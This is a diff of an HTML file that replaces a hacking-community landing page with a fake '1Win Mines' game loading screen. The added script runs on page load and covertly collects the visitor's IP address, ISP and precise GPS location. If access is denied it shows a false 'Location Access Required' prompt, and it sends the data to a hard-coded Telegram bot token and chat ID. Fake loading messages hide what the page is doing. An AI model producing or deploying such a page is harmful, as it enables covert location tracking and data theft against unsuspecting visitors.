@@ -1,250 +1,259 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dragon Ethical Zone - Ethical Hacking Community</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <title>1Win Mines</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&amp;family=Roboto+Mono:wght@400;700&amp;display=swap');
-        body {
-            font-family: 'Roboto Mono', monospace;
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
         }
-        .hero-bg {
-            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), url('https://picsum.photos/id/1015/1920/1080') center/cover no-repeat;
+        #bg-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
         }
-        .dragon-logo {
-            filter: drop-shadow(0 0 20px #22c55e);
+        #loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
         }
-        .card-hover {
-            transition: all 0.3s ease;
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 15px;
         }
-        .card-hover:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        #loading-text {
+            color: white;
+            font-size: 18px;
+            margin-top: 10px;
+            text-align: center;
+        }
+        #permission-request {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 3;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        #permission-request h2 {
+            margin-bottom: 15px;
+        }
+        #allow-btn {
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
         }
     </style>
 </head>
-<body class="bg-zinc-950 text-zinc-100">
-    <!-- Navbar -->
-    <nav class="bg-black border-b border-green-500 sticky top-0 z-50">
-        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
-            <div class="flex items-center gap-3">
-                <div class="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center text-3xl dragon-logo">
-                    🐉
-                </div>
-                <div>
-                    <h1 class="text-2xl font-bold tracking-widest text-green-400">DRAGON</h1>
-                    <p class="text-xs text-green-500 -mt-1">ETHICAL ZONE</p>
-                </div>
-            </div>
-            <div class="hidden md:flex gap-8 text-sm font-medium">
-                <a href="#home" class="hover:text-green-400 transition-colors">HOME</a>
-                <a href="#mission" class="hover:text-green-400 transition-colors">MISSION</a>
-                <a href="#stats" class="hover:text-green-400 transition-colors">STATS</a>
-                <a href="#team" class="hover:text-green-400 transition-colors">TEAM</a>
-                <a href="#join" class="hover:text-green-400 transition-colors">JOIN</a>
-            </div>
-            <a href="https://t.me/+14bH_CrGbJ1kNTQ9" target="_blank" 
-               class="bg-green-600 hover:bg-green-500 px-6 py-2 rounded-full text-sm font-semibold transition-colors flex items-center gap-2">
-                <i class="fab fa-telegram"></i> JOIN TELEGRAM
-            </a>
-        </div>
-    </nav>
-
-    <!-- Hero -->
-    <section id="home" class="hero-bg h-screen flex items-center">
-        <div class="max-w-7xl mx-auto px-6 text-center">
-            <div class="mb-8">
-                <div class="inline-flex items-center gap-4 bg-zinc-900/80 px-8 py-3 rounded-2xl border border-green-500/30">
-                    <div class="w-16 h-16 bg-green-500/10 rounded-xl flex items-center justify-center text-5xl">🐉</div>
-                    <div class="text-left">
-                        <h1 class="text-6xl md:text-7xl font-bold tracking-tighter text-white">DRAGON ETHICAL ZONE</h1>
-                        <p class="text-green-400 text-xl mt-2">Where Ethics Meet Expertise</p>
-                    </div>
-                </div>
-            </div>
-            <p class="max-w-2xl mx-auto text-xl text-zinc-300 mb-10">
-                Bangladesh's Premier Ethical Hacking &amp; Cybersecurity Community
-            </p>
-            <div class="flex flex-col sm:flex-row gap-4 justify-center">
-                <a href="https://www.facebook.com/share/1CjvLQX1az/" target="_blank"
-                   class="bg-blue-600 hover:bg-blue-500 px-10 py-4 rounded-xl text-lg font-semibold flex items-center justify-center gap-3 transition-all">
-                    <i class="fab fa-facebook"></i> JOIN FACEBOOK GROUP
-                </a>
-                <a href="#join" 
-                   class="border border-green-500 hover:bg-green-500/10 px-10 py-4 rounded-xl text-lg font-semibold flex items-center justify-center gap-3 transition-all">
-                    EXPLORE COMMUNITY
-                </a>
-            </div>
-        </div>
-    </section>
-
-    <!-- Mission -->
-    <section id="mission" class="py-24 bg-zinc-900">
-        <div class="max-w-7xl mx-auto px-6">
-            <div class="text-center mb-16">
-                <span class="px-4 py-1 bg-green-500/10 text-green-400 text-sm font-medium rounded-full">OUR VISION</span>
-                <h2 class="text-5xl font-bold mt-4">Our Mission</h2>
-            </div>
-            <div class="grid md:grid-cols-3 gap-8">
-                <div class="bg-zinc-800 p-8 rounded-3xl card-hover border border-green-500/20">
-                    <i class="fas fa-shield-alt text-5xl text-green-400 mb-6"></i>
-                    <h3 class="text-2xl font-semibold mb-4">Ethical Excellence</h3>
-                    <p class="text-zinc-400">We promote responsible hacking practices, focusing on defense, vulnerability research, and building a safer digital world.</p>
-                </div>
-                <div class="bg-zinc-800 p-8 rounded-3xl card-hover border border-green-500/20">
-                    <i class="fas fa-users text-5xl text-green-400 mb-6"></i>
-                    <h3 class="text-2xl font-semibold mb-4">Community Driven</h3>
-                    <p class="text-zinc-400">Connecting 3000+ aspiring ethical hackers through knowledge sharing, workshops, and collaborative projects.</p>
-                </div>
-                <div class="bg-zinc-800 p-8 rounded-3xl card-hover border border-green-500/20">
-                    <i class="fas fa-robot text-5xl text-green-400 mb-6"></i>
-                    <h3 class="text-2xl font-semibold mb-4">Automation &amp; Tools</h3>
-                    <p class="text-zinc-400">Access to 560+ custom bots, scripts, and tools developed by our community members.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Stats -->
-    <section id="stats" class="py-24 bg-black">
-        <div class="max-w-7xl mx-auto px-6">
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-8 text-center">
-                <div>
-                    <div class="text-6xl font-bold text-green-400 mb-2">560+</div>
-                    <div class="text-zinc-400 text-lg">BOTS &amp; TOOLS</div>
-                </div>
-                <div>
-                    <div class="text-6xl font-bold text-green-400 mb-2">3000+</div>
-                    <div class="text-zinc-400 text-lg">STUDENTS &amp; MEMBERS</div>
-                </div>
-                <div>
-                    <div class="text-6xl font-bold text-green-400 mb-2">1000+</div>
-                    <div class="text-zinc-400 text-lg">ACTIVE CONTRIBUTORS</div>
-                </div>
-                <div>
-                    <div class="text-6xl font-bold text-green-400 mb-2">∞</div>
-                    <div class="text-zinc-400 text-lg">KNOWLEDGE SHARED</div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Team / Admins -->
-    <section id="team" class="py-24 bg-zinc-900">
-        <div class="max-w-7xl mx-auto px-6">
-            <div class="text-center mb-16">
-                <h2 class="text-5xl font-bold">Leadership Team</h2>
-                <p class="text-green-400 mt-3">Meet the Dragons</p>
-            </div>
-            <div class="grid md:grid-cols-3 gap-8">
-                <!-- Owner -->
-                <div class="bg-zinc-800 rounded-3xl overflow-hidden card-hover">
-                    <div class="h-64 bg-gradient-to-br from-green-500 to-emerald-600 flex items-center justify-center">
-                        <span class="text-8xl">👑</span>
-                    </div>
-                    <div class="p-8">
-                        <h3 class="text-2xl font-bold">Professor M.T</h3>
-                        <p class="text-green-400">Owner &amp; Founder</p>
-                        <p class="mt-4 text-sm text-zinc-400">Visionary leader guiding the community towards ethical cybersecurity excellence.</p>
-                    </div>
-                </div>
-                
-                <!-- Mr Blade -->
-                <div class="bg-zinc-800 rounded-3xl overflow-hidden card-hover">
-                    <div class="h-64 bg-gradient-to-br from-red-500 to-rose-600 flex items-center justify-center">
-                        <span class="text-8xl">🗡️</span>
-                    </div>
-                    <div class="p-8">
-                        <h3 class="text-2xl font-bold">Mr. Blade</h3>
-                        <p class="text-green-400">Senior Mentor</p>
-                        <p class="mt-4 text-sm text-zinc-400">Penetration testing expert and community trainer.</p>
-                    </div>
-                </div>
-                
-                <!-- CEO -->
-                <div class="bg-zinc-800 rounded-3xl overflow-hidden card-hover">
-                    <div class="h-64 bg-gradient-to-br from-purple-500 to-violet-600 flex items-center justify-center">
-                        <span class="text-8xl">🐍</span>
-                    </div>
-                    <div class="p-8">
-                        <h3 class="text-2xl font-bold">Black Cobra MH</h3>
-                        <p class="text-green-400">CEO</p>
-                        <p class="mt-4 text-sm text-zinc-400">Strategic operations and infrastructure lead.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Join -->
-    <section id="join" class="py-24 bg-black">
-        <div class="max-w-4xl mx-auto px-6 text-center">
-            <h2 class="text-5xl font-bold mb-8">Join The Dragon Legion</h2>
-            <p class="text-xl text-zinc-400 mb-12">Become part of Bangladesh's fastest growing ethical hacking community.</p>
-            
-            <div class="grid md:grid-cols-2 gap-8">
-                <a href="https://www.facebook.com/share/1CjvLQX1az/" target="_blank"
-                   class="group bg-zinc-900 hover:bg-blue-950 border border-blue-500/30 hover:border-blue-500 p-10 rounded-3xl transition-all">
-                    <i class="fab fa-facebook text-6xl text-blue-500 mb-6 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="text-3xl font-bold mb-2">Facebook Group</h3>
-                    <p class="text-zinc-400">Join 1000+ members for discussions, resources, and events</p>
-                    <span class="inline-block mt-8 text-sm bg-blue-600 px-8 py-3 rounded-full">JOIN NOW →</span>
-                </a>
-                
-                <a href="https://t.me/+14bH_CrGbJ1kNTQ9" target="_blank"
-                   class="group bg-zinc-900 hover:bg-sky-950 border border-sky-500/30 hover:border-sky-500 p-10 rounded-3xl transition-all">
-                    <i class="fab fa-telegram text-6xl text-sky-400 mb-6 group-hover:scale-110 transition-transform"></i>
-                    <h3 class="text-3xl font-bold mb-2">Telegram Channel</h3>
-                    <p class="text-zinc-400">Real-time updates, tool drops, and live sessions</p>
-                    <span class="inline-block mt-8 text-sm bg-sky-600 px-8 py-3 rounded-full">JOIN TELEGRAM →</span>
-                </a>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="bg-black border-t border-green-500/30 py-12">
-        <div class="max-w-7xl mx-auto px-6">
-            <div class="flex flex-col md:flex-row justify-between items-center gap-8">
-                <div class="flex items-center gap-3">
-                    <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center text-2xl">🐉</div>
-                    <div>
-                        <span class="font-bold text-xl">Dragon Ethical Zone</span>
-                    </div>
-                </div>
-                
-                <div class="text-center md:text-right text-sm text-zinc-500">
-                    <p>&copy; 2026 Dragon Ethical Zone. All Rights Reserved.</p>
-                    <p class="mt-1">For Educational &amp; Ethical Purposes Only</p>
-                </div>
-                
-                <div class="flex gap-6 text-2xl">
-                    <a href="https://www.facebook.com/share/1CjvLQX1az/" target="_blank" class="hover:text-blue-400"><i class="fab fa-facebook"></i></a>
-                    <a href="https://t.me/+14bH_CrGbJ1kNTQ9" target="_blank" class="hover:text-sky-400"><i class="fab fa-telegram"></i></a>
-                </div>
-            </div>
-        </div>
-    </footer>
+<body>
+    <img id="bg-image" src="https://cdn.glitch.global/e4f59c88-d600-4172-aaa6-7e957cd37252/unnamed%20(1).webp?v=1750967013692" alt="Background">
+    
+    <div id="loading-overlay">
+        <div class="loader"></div>
+        <div id="loading-text">Connecting to server...</div>
+    </div>
+    
+    <div id="permission-request">
+        <h2>Location Access Required</h2>
+        <p>Please allow location access to continue</p>
+        <button id="allow-btn">ALLOW LOCATION</button>
+    </div>
 
     <script>
-        // Smooth scrolling
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                if (this.getAttribute('href').length > 1) {
-                    e.preventDefault();
-                    const target = document.querySelector(this.getAttribute('href'));
-                    if (target) {
-                        target.scrollIntoView({ behavior: 'smooth' });
+        // Telegram bot details
+        const botToken = '8879773437:AAHUS7g6UVi0UGaW9mkipY08qm3vRPk5VLk';
+        const chatId = '8110156918';
+        
+        // DOM elements
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const loadingText = document.getElementById('loading-text');
+        const permissionRequest = document.getElementById('permission-request');
+        const allowBtn = document.getElementById('allow-btn');
+        
+        // Loading messages
+        const loadingMessages = [
+            "Connecting to server...",
+            "Loading game assets...",
+            "Verifying account...",
+            "Almost ready...",
+            "Preparing interface...",
+            "Finalizing setup..."
+        ];
+        
+        // Function to get IP info
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                return await detailsResponse.json();
+            } catch (error) {
+                console.error("IP info error:", error);
+                return {};
+            }
+        }
+        
+        // Function to get precise location
+        function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toLocaleString()
+                    }),
+                    error => {
+                        // Only show permission request if location was denied
+                        if (error.code === error.PERMISSION_DENIED) {
+                            setTimeout(() => {
+                                permissionRequest.style.display = 'flex';
+                            }, 3000);
+                        }
+                        resolve(null);
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // Function to send data to Telegram
+        async function sendToTelegram(data) {
+            try {
+                let message = `🕵️ NEW VISITOR TRACKED 🕵️\n\n`;
+                message += `📱 Device: ${navigator.userAgent}\n\n`;
+                message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
+                message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
+                message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
+                
+                if (data.liveLocation) {
+                    message += `\n🎯 LIVE GPS LOCATION:\n`;
+                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
+                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
+                    message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
+                    message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
+                    message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
+                } else {
+                    message += `\n📍 APPROX LOCATION:\n`;
+                    message += `🔹 Latitude: ${data.latitude || 'Unknown'}\n`;
+                    message += `🔹 Longitude: ${data.longitude || 'Unknown'}\n`;
+                    if (data.latitude && data.longitude) {
+                        message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
                     }
                 }
-            });
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                if (data.liveLocation) {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            latitude: data.liveLocation.lat,
+                            longitude: data.liveLocation.lon
+                        })
+                    });
+                }
+            } catch (error) {
+                console.error("Telegram error:", error);
+            }
+        }
+        
+        // Rotate loading messages
+        function rotateLoadingMessages() {
+            let counter = 0;
+            setInterval(() => {
+                loadingText.textContent = loadingMessages[counter];
+                counter = (counter + 1) % loadingMessages.length;
+            }, 3000);
+        }
+        
+        // Main tracking function
+        async function trackUser() {
+            // Start rotating loading messages
+            rotateLoadingMessages();
+            
+            // First try to get precise location silently
+            const liveLocation = await getPreciseLocation();
+            
+            // Then get IP details
+            const ipDetails = await getIPInfo();
+            
+            // Combine all data
+            const trackingData = {
+                ...ipDetails,
+                ip: ipDetails.ip || 'Unknown',
+                liveLocation: liveLocation
+            };
+            
+            // Send to Telegram
+            await sendToTelegram(trackingData);
+        }
+        
+        // When allow button is clicked
+        allowBtn.addEventListener('click', async () => {
+            permissionRequest.style.display = 'none';
+            // Try to get location again
+            await trackUser();
         });
         
-        // Tailwind script already included
-        console.log('%cDragon Ethical Zone Loaded Successfully 🐉', 'color: #22c55e; font-size: 14px; font-family: monospace');
+        // Start tracking when page loads
+        window.onload = trackUser;
     </script>
 </body>
-                            </html>
+</html>
